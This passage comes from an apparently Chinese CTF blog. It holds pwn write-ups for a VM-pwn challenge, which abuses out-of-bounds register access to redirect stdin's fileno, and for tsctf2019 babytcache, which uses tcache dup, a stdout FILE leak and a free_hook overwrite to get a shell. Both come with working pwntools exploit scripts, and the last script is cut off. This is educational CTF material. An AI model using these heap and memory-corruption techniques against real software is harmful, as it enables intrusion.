class="number">0</span>)</span><br><span class="line">    payload += p8(<span class="number">0x43</span>)+p8(<span class="number">3</span>)+p32(<span class="number">1</span>)</span><br><span class="line">    payload += p8(<span class="number">0x10</span>)+p8(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    payload += p8(<span class="number">0xb0</span>)</span><br><span class="line">    New(payload)</span><br><span class="line">    gdb.attach(p,<span class="string">'''</span></span><br><span class="line"><span class="string">            b* 0x0804873e</span></span><br><span class="line"><span class="string">            b* 0x08048a97</span></span><br><span class="line"><span class="string">            '''</span>)</span><br><span class="line">    Play()</span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(p8(system&amp;<span class="number">0xff</span>))</span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(p8((system&amp;<span class="number">0xffff</span>)&gt;&gt;<span class="number">8</span>))</span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(p8((system&amp;<span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span>))</span><br><span class="line">    Free()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="粤湾中心"><a href="#粤湾中心" class="headerlink" title="粤湾中心"></a>粤湾中心</h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><p>发了之后发现红帽还有道VmPwn，今天做完补一下</p>
<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>输入esp/eip/code，开始有seccomp禁止执行execve，welcome里把flag读了出来并且fddup拷贝到了<code>0x233</code>，这就很像19年信安竞赛的题，我们想办法改stdin的filno为0x233，在最后say goodbye调用printf的时候会输出flag。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">welcome</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 fd; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(<span class="string">"/flag"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"What?"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  dup2(fd, <span class="number">0x233</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(regs, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" _______     ____  ____  ____   ____  ____    ____  "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|_   __    |_   ||   _||_  _| |_  _||_     /   _| "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"  | |__) |    | |__| |        / /    |   /   |   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"  |  __ /     |  __  |       / /     | |  /| |   "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" _| |   _  _| |  | |_      ' /     _| |_/_| |_  "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|____| |___||____||____|     _/     |_____||_____| "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"---------------------------------------------------"</span>);</span><br><span class="line">  alarm(<span class="number">0x20</span>u);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 len; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  __int64 is_shown; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  node *code_addr; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  len = <span class="number">0L</span>L;</span><br><span class="line">  i = <span class="number">0L</span>L;</span><br><span class="line">  code_addr = <span class="number">0L</span>L;</span><br><span class="line">  v7 = <span class="number">0L</span>L;</span><br><span class="line">  is_shown = <span class="number">1L</span>L;</span><br><span class="line">  welcome();</span><br><span class="line">  Seccomp();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tH1s 1s 4 e45y cH411en9e!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"EIP: "</span>, a2);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%ld"</span>, &amp;_eip);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"ESP: "</span>, &amp;_eip);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%ld"</span>, &amp;_esp);</span><br><span class="line">  <span class="keyword">if</span> ( _esp &lt; <span class="number">0</span> )</span><br><span class="line">    ErrorExit();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me code length: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%ld"</span>, &amp;len);</span><br><span class="line">  <span class="keyword">if</span> ( len &gt; <span class="number">0x28</span> || len &lt; <span class="number">0</span> )</span><br><span class="line">    ErrorExit();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me code: "</span>);</span><br><span class="line">  code_addr = (node *)<span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">8</span> * len);</span><br><span class="line">  reg_addr = (__int64)<span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt; len; ++i )</span><br><span class="line">    get_input((__int64)&amp;code_addr[i]);</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)_eip &lt; len )</span><br><span class="line">  &#123;</span><br><span class="line">    main_method(&amp;code_addr[_eip], &amp;is_shown, len);</span><br><span class="line">    ++_eip;</span><br><span class="line">    usleep(<span class="number">0xC350</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  Bye();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要的功能函数相对来说比较简单，主要是对8个寄存器的值进行计算以及一个malloc到bss上的堆地址的赋值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">main_method</span><span class="params">(node *code, _QWORD *is_shown, <span class="keyword">unsigned</span> __int64 code_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( _esp &gt; <span class="number">0x1000</span> || _esp &lt; <span class="number">0</span> || code-&gt;low2 &gt; <span class="number">8u</span> || code-&gt;low1 &gt; <span class="number">8u</span> || code_len &lt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)_eip )</span><br><span class="line">    ErrorExit();</span><br><span class="line">  v3 = code-&gt;code_low_6;</span><br><span class="line">  <span class="keyword">if</span> ( code-&gt;code_low_6 == <span class="number">0x70</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    SetReg_0(&amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low1]);<span class="comment">// set stdin's fileno</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v3 &gt; <span class="number">0x70</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">0xC0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Mul(&amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low2], &amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low1]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 &gt; <span class="number">0xC0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xE0</span>:</span><br><span class="line">          LeftMv(&amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low2], &amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low1]);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xF0</span>:</span><br><span class="line">          RightMv(&amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low2], &amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low1]);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xD0</span>:</span><br><span class="line">          Sub(&amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low2], &amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low1]);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xA0</span>:</span><br><span class="line">          Add(&amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low2], &amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low1]);<span class="comment">// add useful!</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xB0</span>:</span><br><span class="line">          Div(&amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low2], &amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low1]);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x80</span>:</span><br><span class="line">          SetReg(&amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low1]);<span class="comment">// overflow?</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">0x41</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ArbWrite(&amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low2], &amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v3 &gt; <span class="number">0x41</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x50</span>:</span><br><span class="line">        SubEip(&amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low1]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x60</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *is_shown )</span><br><span class="line">          Show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x42</span>:</span><br><span class="line">        ArbRead(&amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low2], &amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low1]);<span class="comment">// mov stdin to reg</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x20</span>:</span><br><span class="line">        Or(&amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low2], &amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low1]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x40</span>:</span><br><span class="line">        Mov(&amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low2], (<span class="keyword">unsigned</span> __int8)code-&gt;low1);<span class="comment">// set reg[low2] using low1</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">        Xor(&amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low2], &amp;regs[(<span class="keyword">unsigned</span> __int8)code-&gt;low1]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以通过一些加减操作构造<code>reg[i]</code>为任意值，而其中有几个函数的<code>reg[i]</code>类型为signed int，因此会前溢越界，先把stdin的低4字节拷贝到reg里加0x6c到fileno的位置-4再把它放回到reg_addr的位置，SetReg_0即可往里写0x233<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">ArbRead</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> *a1, <span class="keyword">signed</span> <span class="keyword">int</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// ST18_8</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  regs[*a1] = dword_203080[*a2];                <span class="comment">// 越界</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">SetReg_0</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// ST18_8</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_DWORD *)(reg_addr + <span class="number">4L</span>L * ++_esp) = *a1;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="exp-py-4"><a href="#exp-py-4" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Pack</span><span class="params">(choice,low2,low1)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str(((choice)&lt;&lt;<span class="number">16</span>) + (low2&lt;&lt;<span class="number">8</span>) + low1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"EIP: "</span>,<span class="string">"0"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"ESP: "</span>,<span class="string">"0"</span>)</span><br><span class="line">    payload = []</span><br><span class="line">    <span class="comment">#-12:stdin</span></span><br><span class="line">    payload.append(Pack(<span class="number">0x40</span>,<span class="number">0</span>,<span class="number">8</span>))<span class="comment">#0:8</span></span><br><span class="line">    payload.append(Pack(<span class="number">0x40</span>,<span class="number">1</span>,<span class="number">4</span>))<span class="comment">#1:4</span></span><br><span class="line">    payload.append(Pack(<span class="number">0x40</span>,<span class="number">3</span>,<span class="number">2</span>))<span class="comment">#3:2</span></span><br><span class="line">    payload.append(Pack(<span class="number">0x40</span>,<span class="number">4</span>,<span class="number">1</span>))<span class="comment">#4:1</span></span><br><span class="line">    payload.append(Pack(<span class="number">0x40</span>,<span class="number">6</span>,<span class="number">1</span>))<span class="comment">#6:1</span></span><br><span class="line">    payload.append(Pack(<span class="number">0xa0</span>,<span class="number">0</span>,<span class="number">0</span>))<span class="comment">#0:16</span></span><br><span class="line">    payload.append(Pack(<span class="number">0xa0</span>,<span class="number">0</span>,<span class="number">1</span>))<span class="comment">#0:20</span></span><br><span class="line">    payload.append(Pack(<span class="number">0xd0</span>,<span class="number">2</span>,<span class="number">0</span>))<span class="comment">#2:-20</span></span><br><span class="line">    payload.append(Pack(<span class="number">0xd0</span>,<span class="number">5</span>,<span class="number">3</span>))<span class="comment">#5:-2</span></span><br><span class="line">    payload.append(Pack(<span class="number">0x42</span>,<span class="number">5</span>,<span class="number">2</span>))<span class="comment">#reg[-2]:stdin</span></span><br><span class="line">    payload.append(Pack(<span class="number">0xd0</span>,<span class="number">4</span>,<span class="number">0</span>))<span class="comment">#4:-21</span></span><br><span class="line">    payload.append(Pack(<span class="number">0xa0</span>,<span class="number">6</span>,<span class="number">5</span>))<span class="comment">#6:-1</span></span><br><span class="line">    payload.append(Pack(<span class="number">0x42</span>,<span class="number">6</span>,<span class="number">4</span>))<span class="comment">#reg[-1]:stdin+4</span></span><br><span class="line">    <span class="comment">#now reg_addr(malloc) is stdin_addr</span></span><br><span class="line">    <span class="comment">#still we need to add 0x70 to it</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        payload.append(Pack(<span class="number">0xa0</span>,<span class="number">0</span>,<span class="number">0</span>))<span class="comment">#0:16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        payload.append(Pack(<span class="number">0xa0</span>,<span class="number">0</span>,<span class="number">1</span>))<span class="comment">#0:16</span></span><br><span class="line">    payload.append(Pack(<span class="number">0xd0</span>,<span class="number">7</span>,<span class="number">3</span>))</span><br><span class="line">    <span class="comment">#mov stdin to reg[3]</span></span><br><span class="line">    <span class="comment">#payload.append(Pack(0x40,3,3))#33</span></span><br><span class="line">    payload.append(Pack(<span class="number">0x42</span>,<span class="number">3</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    payload.append(Pack(<span class="number">0xa0</span>,<span class="number">2</span>,<span class="number">0</span>))</span><br><span class="line">    <span class="comment">#mov reg[2] to reg[-2]</span></span><br><span class="line">    <span class="comment">#arb write</span></span><br><span class="line">    payload.append(Pack(<span class="number">0x41</span>,<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line">    payload.append(Pack(<span class="number">0x42</span>,<span class="number">7</span>,<span class="number">1</span>))</span><br><span class="line">    <span class="comment">#now we make 0x233</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        payload.append(Pack(<span class="number">0xa0</span>,<span class="number">0</span>,<span class="number">0</span>))<span class="comment">#0:16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        payload.append(Pack(<span class="number">0xa0</span>,<span class="number">1</span>,<span class="number">1</span>))<span class="comment">#0:16</span></span><br><span class="line"></span><br><span class="line">    payload.append(Pack(<span class="number">0xa0</span>,<span class="number">0</span>,<span class="number">1</span>))<span class="comment">#0:16</span></span><br><span class="line">    payload.append(Pack(<span class="number">0x40</span>,<span class="number">1</span>,<span class="number">3</span>))<span class="comment">#0:8</span></span><br><span class="line">    payload.append(Pack(<span class="number">0xa0</span>,<span class="number">0</span>,<span class="number">1</span>))<span class="comment">#0:16</span></span><br><span class="line">    <span class="comment"># now we can really write</span></span><br><span class="line">    payload.append(Pack(<span class="number">0x70</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">"Give me code length:"</span>,str(len(payload)))</span><br><span class="line">    p.recvuntil(<span class="string">"Give me code:"</span>)</span><br><span class="line">    gdb.attach(p,<span class="string">'''</span></span><br><span class="line"><span class="string">            b * 0x0000555555554000+0x1710</span></span><br><span class="line"><span class="string">            '''</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(payload)):</span><br><span class="line">        p.sendline(payload[i])</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>VmPwn对于逆向要求的更多，要理清楚各个函数对应操作的指令。不太懂的时候可以动态地调试查看各种操作造成的结果。虽然慢，但是慢慢来也会理清楚，现在看到的大多数都是越界读写造成的问题，有时候也不需要泄露libc地址，直接通过mov等指令结合add/sub计算得到system或one_gadget。最终getshell。</p>
]]></content>
      <categories>
        <category>VmPwn</category>
      </categories>
  </entry>
  <entry>
    <title>babytcache</title>
    <url>/2020/09/03/babytcache/</url>
    <content><![CDATA[<h1 id="tsctf2019-gt-babytcache"><a href="#tsctf2019-gt-babytcache" class="headerlink" title="tsctf2019-&gt;babytcache"></a>tsctf2019-&gt;babytcache</h1><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>这道题是pwnable里tcache_tear改编来的，程序只有Alloc和Delete功能，没有泄露地址的函数，这里要考虑用文件结构体来泄露，具体可以参考hitcon的babytcache和bctf的three和前两天信安竞赛的bms</p>
<p><img src="/2020/09/03/babytcache/3.jpg" alt="init"></p>
<p><img src="/2020/09/03/babytcache/1.jpg" alt="main"></p>
<p><img src="/2020/09/03/babytcache/2.jpg" alt="Alloc"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>Init里用mmap分配了一块内存，查一下prot是可读可写，mmap分配成功即返回target_addr，因此第一次read调用的是read(0,0xabcda000,0x200)，根据原题的思路，我们可以在这个地址范围内构造一个fake_chunk，其size为0x100，在它的next_chunk处修改其size为0x21，使得prev_in_use为1，通过tcache dup可以Malloc到这个地址，再free(0xabcda010)，由于之前已经两次Free这个地址了,count对应位置被置为0，free的时候直接减1变成0xff&gt;7，意味着tcache bin被填满，不再放入Tcache而是small bin，成为unsorted bin。</p>
<p><img src="/2020/09/03/babytcache/4.jpg" alt="leak"></p>
<p>使用tcache dup，从unsorted bin中分配0x90再double free，这时候unsored bin被切割成两部分，由于剩下的部分size依然满足unsorted bin要求，新的unsorted bin为0xabcda0a0。其fd和bk写入了main_arena+88，double free的结果是0x90被放入了tcache entry。</p>
<p>分配一个chunk，使得tcahe的next被改成0xabcda0b0，tcache_entry链上增加了0xabcda0b0。</p>
<p>Alloc(0x40)分配的是Unsorted bin，其fd被覆写了2个低字节，注意此时这个chunk也在tcache_entry里，相当于next指针被修改了。</p>
<p>All(0x90)分配的chunk为0xabcda000，Alloc(0x90)再分配的chunk为0xabcda0a0，再Alloc(0x90)分配的就是之前爆破的fake_addr，这里修改为p64(0xfbad1800)+p64(0)*3+’\x00’，造成泄露，调试过程中查看这个地址与libc_base的距离，记为offset，这个偏移是固定的，之后得到的地址减去offset即可得到libc_base<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Alloc(<span class="number">0x90</span>,p64(<span class="number">0xabcda0b0</span>))</span><br><span class="line">Alloc(<span class="number">0x40</span>,<span class="string">'\x60\x67'</span>)<span class="comment">#0xabcda0b0 =&gt; chunk extend with 0xabcda100 overwrite last 2 bytes</span></span><br><span class="line">Alloc(<span class="number">0x90</span>,<span class="string">"c\n"</span>)<span class="comment">#chunk addr =&gt; 0xabcda000</span></span><br><span class="line">Alloc(<span class="number">0x90</span>,<span class="string">"d\n"</span>)<span class="comment">#chunk addr =&gt; 0xabcda0a0</span></span><br><span class="line">payload = p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span></span><br><span class="line">Alloc(<span class="number">0x90</span>,payload)</span><br></pre></td></tr></table></figure></p>
<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><p>使用one_gadget得到Libc的gadgets，覆写free_hook为one_gadget的地址，分配一个chunk，其内容为’/bin/sh\x00’。Free(chunk_addr)即可调用system(‘/bin/sh\x00’)</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"info"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">elf = ELF(<span class="string">'./main'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./main'</span>)</span><br><span class="line">    <span class="comment">#p = process(["./main"],env=&#123;"LD_PRELOAD":'./libc-2.27.so'&#125;)</span></span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'10.112.100.47'</span>,<span class="number">2333</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Please input your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'input size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'input data:'</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Please input your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Init</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'input your secret:'</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + <span class="string">'a'</span>*<span class="number">0xf0</span></span><br><span class="line">    <span class="comment">#next chunk prev_in_use must be *1</span></span><br><span class="line">    payload += p64(<span class="number">0x0</span>) + p64(<span class="number">0x21</span>) + <span class="string">'b'</span>*<span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">    Init()</span><br><span class="line">    <span class="comment">#malloc unsorted bin</span></span><br><span 